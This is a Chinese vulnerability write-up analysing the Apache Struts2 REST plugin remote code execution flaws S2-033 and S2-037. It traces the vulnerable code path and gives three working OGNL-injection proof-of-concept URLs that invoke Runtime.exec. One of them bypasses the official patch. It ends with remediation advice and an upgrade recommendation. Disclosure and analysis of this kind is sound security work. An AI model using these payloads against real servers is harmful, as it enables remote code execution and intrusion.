# PKAV 发现 Struts2 最新远程命令执行漏洞（S2-037）

0x00 前言
=======

* * *

刚过完儿童节回来发现struts2 出了S033，于是放下手中的棒棒糖赶紧分析一下。

![](http://drops.javaweb.org/uploads/images/d25a2c0638caf52bb1ebfafe0f7fd6ea061dbe2a.jpg)

0x01 S2-033 漏洞回顾
================

* * *

先来回顾一下S033

根据官方描述

![](http://drops.javaweb.org/uploads/images/1bd3a812084b0eb21e32b26c79bd191470f735bc.jpg)

很明显有两个关键点：第一个是REST Plugin,另一个是Dynamic Method Invocation is enabled.（也就是开启动态方法执行），看到这里需要满足两个条件，感觉有点鸡肋啊……

直接下载回来源代码调试，载入官方的演示包struts2-rest-showcase.war，我们先随便访问一个连接`/struts2-rest-showcase/orders/1`,很快定位到关键代码

Rest-plujin包里面的`org.apache.struts2.rest.RestActionMapper`

![](http://drops.javaweb.org/uploads/images/6cbe5959f1833febf6889c4c4e344d583b708de0.jpg)

首先要过第一关：dropExtension,这个方法会检查后缀名

![](http://drops.javaweb.org/uploads/images/823a00f9238d847cb4a1f3c6b6d8c76b0b4eaa16.jpg)

其中extensions的值来自配置文件struts-plugin.xml，默认是：

![](http://drops.javaweb.org/uploads/images/5745bb3ce9fece5f0b4bffd121a648ee8ec695ad.jpg)

因此要想通过检查我们需要构造一个.xhtml、.xml或者.json结尾的URL，或者没有后缀直接是xx/xx,这就不能使用”.”这显然是不行的。

继续往下调试：

![](http://drops.javaweb.org/uploads/images/99b913b2dbb2ef3600acdc4a2d00f470d52e9946.jpg)

就是说如果刚才的链接里面出现了!就进入下面的流程直接得到一个!后面的值，然后没有过滤直接放在了mapping里面

构造链接：`/struts2-rest-showcase281/orders/3/1!{xxx}`

![](http://drops.javaweb.org/uploads/images/4f3df83d85e58d8f0b445662c3ab91d5646e36ea.jpg)

在加上前面有一个allowDynamicMethodCalls的判断，几乎可以肯定漏洞点就是在这儿,继续往下走，最终method会进入到，com.opensymphony.xwork2.DefaultActionInvocation类的invokeAction方法，如下图

![](http://drops.javaweb.org/uploads/images/adf0c6531d25c22c5f26bab6324879be988aab59.jpg)

我们看到methodName直接进入到了ognlUtil.getValue方法，对struts2历史漏洞有点熟悉的同学都知道，这个就是最终导致代码执行的地方。不多说，直接上POC：

```
http://127.0.0.1:8888/struts2-rest-showcase/orders/3!%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(%23parameters.cmd),index.xhtml?cmd=calc

```

![](http://drops.javaweb.org/uploads/images/60de4e60cfd698c2243064c7fc6456cd76f8cb41.jpg)

0x02 绕过动态方法执行的限制
================

* * *

但是如果真的只是这样这个漏洞真的是比较鸡肋的，因为动态方法在这里默认是不开启的，那我们接着分析，有没有可能不用开动态方法都可以执行任意代码了，答案是肯定的。这个地方能不能代码执行主要是这个地方的限制

![](http://drops.javaweb.org/uploads/images/4a139730ac3a94d0fa4bbb41db5342b0516cfd59.jpg)

其实只要我们继续往下走，会发现其他地方也会mapping.setMethod代码如下

![](http://drops.javaweb.org/uploads/images/76a4fecbd3bebbae23b69591e06a2f72850b66ae.jpg)

其实无非就是：

```
http://127.0.0.1:8888/struts2-rest-showcase/orders/3/methodName

```

这样构造就不需要动态方法执行了，上POC：

```
http://127.0.0.1:8888/struts2-rest-showcase/orders/3/%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(%23parameters.cmd),index.xhtml?cmd=calc

```

这个算其实已经算是一个0day了，这个可以绕过了动态方法执行的限制。但是这还不够，于是我马上找来了最新官方声称漏洞修复的2.3.281、2.3.20.3 and 2.3.24.3，同样的代码却报错了

![](http://drops.javaweb.org/uploads/images/a67168580f1b728192c1ba9e8507abb462440457.jpg)

难道官方是这样修复的，改了检查方法执行的方法checkEnableEvalExpression，这个方法是在request.xx(x)这种代码执行的方式后加入的判断，主要是为了杜绝参数名上面的代码执行，不过好在这个地方我们不需要这种方式执行代码。经过研究我还是通过三目运算符绕过了这个检测，POC：

```
http://127.0.0.1:8888/struts2-rest-showcase281/orders/3/(%23mem=%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3f@java.lang.Runtime@getRuntime().exec(%23parameters.cmd):index.xhtml?cmd=calc

```

![](http://drops.javaweb.org/uploads/images/c4b3bb07b0e7af0955ce3d3ec7a7581aee032d7c.jpg)

6月3号的时候我给struts2官方提交了这个新的高危漏洞(CVE编号CVE-2016-4438)，影响所有使用了REST插件的用户，无需要开启动态方法执行（不包括struts 2.5）,此后的几天网上不断有关于s2-033的分析与绕过出来，但是他们大都错误的认为需要开启动态方法执行才能触发漏洞，其实并不需要。正如官方回复这个漏洞说的

![](http://drops.javaweb.org/uploads/images/562bf4c3b61bb43fcef9fdca8e6ecae76e0553a9.jpg)

去掉了with ! operator when Dynamic Method Invocation is enabled这句话，因此这个漏洞影响更为广泛。

0x03 修复建议
=========

* * *

在上一个版本里面也是method出的问题，当时是加入了cleanupActionName方法进行过滤，如果这个地方要修复，也可以加入这个方法过滤一下即可。更新至官方struts 2.3.29

**在线检测：**[http://www.pkav.net/tool/struts2/index.php](http://www.pkav.net/tool/struts2/index.php)

**参考：**https://cwiki.apache.org/confluence/display/WW/S2-037